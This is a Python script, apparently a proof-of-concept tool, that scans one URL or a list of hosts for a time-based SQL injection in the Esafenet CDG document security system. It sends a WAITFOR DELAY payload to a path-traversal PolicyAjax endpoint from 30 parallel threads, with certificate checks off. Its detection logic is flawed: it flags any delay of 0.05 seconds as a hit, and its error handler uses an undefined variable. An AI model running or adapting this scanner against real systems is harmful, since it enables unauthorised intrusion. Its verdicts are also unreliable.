import time

import requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    targets = []
    parse = argparse.ArgumentParser(description="亿赛通电子文档安全管理系统SQL注入漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='input file')

    args = parse.parse_args()
    pool = Pool(30)

    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            target = f"http://{args.url}"
            check(target)
    elif args.file:
        f = open(args.file, 'r+')
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
    pool.map(check, targets)
    pool.close()

def check(target):
    target = f"{target}/CDGServer3/dojojs/../PolicyAjax"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101Firefox/120.0',
    }
    sql_payload = ";WAITFOR DELAY '0:0:5'--"
    data = {
        'command': 'selectOption',
        'id': f"-1'{sql_payload}",
        'type': 'JMCL'
    }
    start_time = time.time()
    try:
        response = requests.post(target, headers=headers, verify=False, data=data)
        end_time = time.time()
        elapsed_time = end_time - start_time
        if response.status_code == 200 and round(elapsed_time,2) >= 0.05:
            print(f"[+] {target} 存在漏洞！")
        else:
            print(f"[-] {target} 不存在漏洞！+ {end_time:.2f} + {start_time:.2f}")
    except Exception as e:
        print(f"[TimeOut] {target} 超时+ {end_time:.2f} + {start_time:.2f}")

if __name__ == '__main__':
    main()